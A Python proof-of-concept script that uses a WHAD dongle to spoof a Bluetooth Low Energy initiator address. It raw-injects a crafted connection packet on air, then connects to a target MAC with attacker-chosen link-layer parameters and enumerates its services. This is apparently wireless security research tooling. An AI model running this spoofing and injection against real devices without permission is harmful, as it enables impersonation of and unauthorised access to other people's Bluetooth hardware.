#!/usr/bin/env python3
import argparse, time, sys

def _parse_args():
    p = argparse.ArgumentParser(description="Max-fidelity connect: spoof InitA + custom LLData + raw_inject proof.")
    p.add_argument("mac", nargs="?", default="C0:00:00:41:73:AC", help="target MAC (default: %(default)s)")
    p.add_argument("--port", default="uart0", help="WHAD dongle port (default: %(default)s)")
    return p.parse_args()

ARGS = _parse_args()

RAW = bytes.fromhex("8522AABBCCDDEEFFAC73410000C0A1B2C3D412345602000018000000C800FFFFFFFF1F2D")
T0 = time.time()
def log(m): print(f"[{time.time()-T0:6.2f}s] {m}", flush=True)

from whad.device import WhadDevice
from whad.ble.connector import Central
from whad.hub.ble import ChannelMap

dev = WhadDevice.create(ARGS.port)
c = Central(dev)

# claim YOUR InitA so the packet matches the builder
for args in (("FF:EE:DD:CC:BB:AA",), ("FF:EE:DD:CC:BB:AA", False)):
    try:
        c.set_bd_address(*args); log(f"set_bd_address{args} ok"); break
    except Exception as e: log(f"set_bd_address{args}: {type(e).__name__}: {e}")

log("PHASE A - raw_inject: literal 36 bytes on-air x5 (sniffer artifact)")
try:
    from scapy.layers.bluetooth4LE import BTLE
    PKT = BTLE(bytes.fromhex("D6BE898E") + RAW)
    for i in range(5):
        try: c.raw_inject(PKT); log(f"  raw_inject #{i+1} sent")
        except Exception as e: log(f"  raw_inject: {type(e).__name__}: {e}"); break
        time.sleep(0.2)
except Exception as e: log(f"PHASE A skipped: {e}")

log("PHASE B - max-fidelity connect (29/36 builder bytes + accepted + live)")
try:
    conn = c.connect(ARGS.mac, random=True,
                     access_address=0xD4C3B2A1, crc_init=0x563412,
                     channel_map=ChannelMap.from_int(0x1FFFFFFFFF),
                     hop_interval=24, hop_increment=13)
except Exception as e:
    log(f"[-] connect failed: {type(e).__name__}: {e}"); sys.exit(1)

log("[+] CONNECTED - InitA/AdvA/AA/CRCInit/ChanMap/Interval/Hop all YOURS")
t0 = time.time()
try:
    conn.discover()
    svcs = conn.services
    if callable(svcs): svcs = svcs()
    log(f"[+] discovery OK after {time.time()-t0:.2f}s - {len(svcs)} services")
    for s in svcs: log(f"    {s}")
except Exception as e:
    log(f"[!] discovery: {type(e).__name__}: '{e}'")
for i in range(5):
    time.sleep(1); log(f"    link alive at t+{i+1}s")
try: conn.disconnect()
except Exception: pass
log("[*] done")
